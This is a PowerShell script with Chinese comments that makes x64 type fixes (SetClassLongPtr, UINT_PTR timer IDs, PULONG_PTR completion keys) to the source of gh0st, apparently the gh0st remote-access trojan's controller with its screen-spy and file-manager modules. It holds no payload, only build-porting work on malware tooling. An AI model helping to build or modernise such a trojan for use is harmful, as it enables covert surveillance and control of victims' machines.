# 主控 gh0st x64 类型修复（自动检测编码，保护中文注释）
$ErrorActionPreference='Stop'
$root="C:\Users\Administrator\Desktop\本机研究原理"

function Detect-Encoding($f){
  $b=[IO.File]::ReadAllBytes($f)
  if($b.Length-ge3 -and $b[0]-eq0xEF -and $b[1]-eq0xBB -and $b[2]-eq0xBF){ return (New-Object Text.UTF8Encoding($true)) }
  try{
    $strict=New-Object Text.UTF8Encoding($false,$true)
    [void]$strict.GetString($b)
    return (New-Object Text.UTF8Encoding($false))
  }catch{ return [Text.Encoding]::GetEncoding(936) }
}
function Edit-Text($rel,[string[]]$pairs){
  $f=Join-Path $root $rel
  $enc=Detect-Encoding $f
  $c=[IO.File]::ReadAllText($f,$enc)
  for($i=0;$i -lt $pairs.Count;$i+=2){
    $old=$pairs[$i];$new=$pairs[$i+1]
    if($c.Contains($new)){ "skip $rel"; continue }
    if(-not $c.Contains($old)){ throw "[$rel] 未找到: $old" }
    $c=$c.Replace($old,$new)
  }
  [IO.File]::WriteAllText($f,$c,$enc)
  "OK $rel"
}

# 1) ScreenSpyDlg.cpp：SetClassLong -> SetClassLongPtr（按行，仅命中行）
$f=Join-Path $root 'gh0st\ScreenSpyDlg.cpp'
$enc=Detect-Encoding $f
$raw=[IO.File]::ReadAllText($f,$enc)
$eol=if($raw.Contains("`r`n")){"`r`n"}else{"`n"}
$out=New-Object 'System.Collections.Generic.List[string]'
$n=0
foreach($line in ($raw -split "`r?`n")){
  if($line.Contains('SetClassLong')){
    $l=$line.Replace('SetClassLong(','SetClassLongPtr(').Replace('GCL_HCURSOR','GCLP_HCURSOR').Replace('(LONG)','(LONG_PTR)')
    $out.Add($l); $n++
  } else { $out.Add($line) }
}
[IO.File]::WriteAllText($f,($out -join $eol),$enc)
"OK ScreenSpyDlg.cpp ($n 行)"

# 2) FileManagerDlg.h OnTimer 签名
Edit-Text 'gh0st\FileManagerDlg.h' @(
 'afx_msg void OnTimer(UINT nIDEvent);',
 'afx_msg void OnTimer(UINT_PTR nIDEvent);'
)
# 3) FileManagerDlg.cpp OnTimer 定义
Edit-Text 'gh0st\FileManagerDlg.cpp' @(
 'void CFileManagerDlg::OnTimer(UINT nIDEvent)',
 'void CFileManagerDlg::OnTimer(UINT_PTR nIDEvent)'
)
# 4) IOCPServer 完成键类型
Edit-Text 'gh0st\include\IOCPServer.cpp' @(
 '(LPDWORD) &lpClientContext',
 '(PULONG_PTR)&lpClientContext'
)
# 5) TrayIcon OnTrayNotification 签名
Edit-Text 'gh0st\TrayIcon.cpp' @(
 'LRESULT CTrayIcon::OnTrayNotification(UINT wParam, LONG lParam)',
 'LRESULT CTrayIcon::OnTrayNotification(WPARAM wParam, LPARAM lParam)'
)
"ALL GH0ST X64 FIXES DONE"
